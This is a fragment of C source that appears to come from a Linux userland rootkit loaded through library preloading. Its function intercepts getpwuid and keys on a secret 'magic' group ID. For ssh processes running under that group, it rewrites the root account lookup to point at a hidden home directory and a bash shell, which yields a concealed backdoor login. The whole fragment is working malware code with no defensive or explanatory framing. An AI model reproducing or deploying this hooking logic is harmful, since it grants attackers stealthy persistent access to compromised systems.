struct passwd *getpwuid(uid_t uid){
    hook(CGETPWUID);
    gid_t magicgid = readgid();
    if(uid == magicgid) return call(CGETPWUID, 0);

    if(getgid() == magicgid && uid == 0 && process("ssh")){
        struct passwd *bpw = call(CGETPWUID, uid);

        bpw->pw_uid = magicgid;
        bpw->pw_gid = magicgid;
        bpw->pw_dir = HOMEDIR;
        bpw->pw_shell = "/bin/bash";
        return bpw;
    }

    return call(CGETPWUID, uid);
}
